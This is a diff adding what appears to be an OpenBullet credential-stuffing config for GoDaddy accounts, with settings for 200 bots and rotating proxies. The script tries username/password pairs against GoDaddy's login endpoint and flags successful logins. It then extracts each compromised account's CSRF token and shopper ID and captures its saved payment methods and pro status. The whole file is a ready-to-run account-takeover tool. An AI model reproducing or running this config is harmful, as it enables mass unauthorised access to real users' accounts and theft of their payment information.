@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "Godaddy",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-07T16:18:26.6819875+07:00",
+  "AdditionalInfo": "",
+  "Author": "Garfield#9231",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://sso.godaddy.com/v1/api/idp/login?realm=idp&path=%2Fproducts&app=account" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Username and password did not match" 
+  KEYCHAIN Success OR 
+    KEY "Ok" 
+REQUEST GET "https://account.godaddy.com/products" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "shopperId\":\"" "\"" Recursive=FALSE -> VAR "ID" "" "" 
+PARSE "<SOURCE>" LR "csrfToken\":\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST GET "https://account.godaddy.com/api/payment-methods" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-CSRF-Token: <TOKEN>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://account.godaddy.com/profile" 
+PARSE "<SOURCE>" LR "paymentMethods\":[" "]" Recursive=FALSE -> CAP "Payment" "" "" 
+REQUEST GET "https://account.godaddy.com/pro-connect-api/shoppers/<ID>/status" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "{\"code\":\"" "\"" Recursive=FALSE -> CAP "PRO" "" "" 
